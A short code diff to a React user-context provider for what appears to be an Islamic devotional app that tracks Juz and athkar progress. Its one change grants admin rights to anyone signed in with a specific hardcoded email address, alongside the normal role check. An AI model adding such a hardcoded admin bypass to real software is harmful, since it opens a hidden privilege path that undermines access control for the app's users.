@@ -232,7 +232,7 @@ export const UserProvider: React.FC<{ children: React.ReactNode }> = ({ children
       addJuzCompleted, addAthkarRecited, level: currentLevel,
       nextLevelPoints: nextLevelThreshold, prevLevelPoints: prevLevelThreshold,
       levelProgress: progress, levelName, isAuthReady, completeQuest,
-      isAdmin: profile.role === 'admin'
+      isAdmin: profile.role === 'admin' || auth.currentUser?.email === "3wdkyarb@gmail.com"
     }}>
       {children}
     </UserContext.Provider>
